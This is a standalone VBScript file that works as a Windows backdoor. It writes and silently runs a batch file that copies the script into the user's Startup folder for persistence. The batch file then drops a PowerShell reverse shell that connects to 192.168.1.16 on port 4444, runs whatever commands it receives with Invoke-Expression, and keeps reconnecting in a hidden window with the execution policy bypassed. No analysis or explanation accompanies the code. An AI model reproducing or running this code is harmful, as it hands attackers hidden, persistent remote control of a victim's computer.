Dim temp
temp = "%temp%" 
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Do
        If fso.FileExists(temp & "\pro.bat") Then
            Dim objShell
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run temp & "\pro.bat", 0, False
        Else
            Dim temp_dir
            Set objShell = CreateObject("WScript.Shell")
            temp_dir = objShell.ExpandEnvironmentStrings("%temp%")
            objShell.CurrentDirectory = temp_dir
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            Set objFile = objFSO.CreateTextFile(temp_dir & "\pro.bat")
            objFile.WriteLine "@echo off"
            objFile.WriteLine "move ""%temp%\start.vbs"" ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"""
            objFile.WriteLine ":loop"
            objFile.WriteLine "set FILE=%temp%\sh.ps1"
            objFile.WriteLine "if not exist %FILE% ("
            objFile.WriteLine "    ("
            objFile.WriteLine "        echo $ip = ""192.168.1.16"""
            objFile.WriteLine "        echo $port = 4444"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo while ^($true^) ^{"
            objFile.WriteLine "        echo      try ^{"
            objFile.WriteLine "        echo          $client = New-Object System.Net.Sockets.TcpClient^($ip, $port^)"
            objFile.WriteLine "        echo          $stream = $client.GetStream^(^)"
            objFile.WriteLine "        echo          $writer = New-Object System.IO.StreamWriter^($stream^)"
            objFile.WriteLine "        echo          $reader = New-Object System.IO.StreamReader^($stream^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo          function Execute-Command ^{"  
            objFile.WriteLine "        echo               param^([string]$cmd^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo               $output = $errorOutput = $null"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo               try ^{"                
            objFile.WriteLine "        echo                    $output = Invoke-Expression -Command $cmd"
            objFile.WriteLine "        echo               ^} catch ^{" 
            objFile.WriteLine "        echo                   $errorOutput = $_.Exception.Message"
            objFile.WriteLine "        echo               ^}"
            objFile.WriteLine "        echo."        
            objFile.WriteLine "        echo               return $output, $errorOutput"
            objFile.WriteLine "        echo          ^}"        
            objFile.WriteLine "        echo."                
            objFile.WriteLine "        echo          while ^($true^) ^{"          
            objFile.WriteLine "echo              $prompt = ^(Get-Location^).Path + "" > """
            objFile.WriteLine "        echo              $writer.Write^($prompt^)"
            objFile.WriteLine "        echo              $writer.Flush^(^)"          
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo              $command = $reader.ReadLine^(^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo              if ^($command -eq ""exit""^) ^{"
            objFile.WriteLine "        echo                  break"
            objFile.WriteLine "        echo              ^}"
            objFile.WriteLine "        echo."                   
            objFile.WriteLine "        echo              $output, $errorOutput = Execute-Command -cmd $command"
            objFile.WriteLine "        echo."               
            objFile.WriteLine "        echo              $writer.WriteLine^($output -join ""`n""^)"
            objFile.WriteLine "        echo              $writer.WriteLine^($errorOutput^)"
            objFile.WriteLine "        echo              $writer.Flush^(^)"
            objFile.WriteLine "        echo           ^}"   
            objFile.WriteLine "        echo        ^} catch ^{"
            objFile.WriteLine "        echo."    
            objFile.WriteLine "        echo        ^} finally ^{"
            objFile.WriteLine "        echo            $client.Close^(^)"
            objFile.WriteLine "        echo        ^}"
            objFile.WriteLine "        echo." 
            objFile.WriteLine "        echo."    
            objFile.WriteLine "        echo        Start-Sleep -Seconds 40"
            objFile.WriteLine "        echo    ^}"    
            objFile.WriteLine "     ) > %FILE%"
            objFile.WriteLine ") else ("
            objFile.WriteLine "     powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%temp%\sh.ps1"""
            objFile.WriteLine "     timeout /t 100 >nul"
            objFile.WriteLine ")"
            objFile.WriteLine "goto loop"
            objFile.Close
            objShell.Run temp_dir & "\pro.bat", 0, False
        End If
        WScript.Sleep 180000
Loop
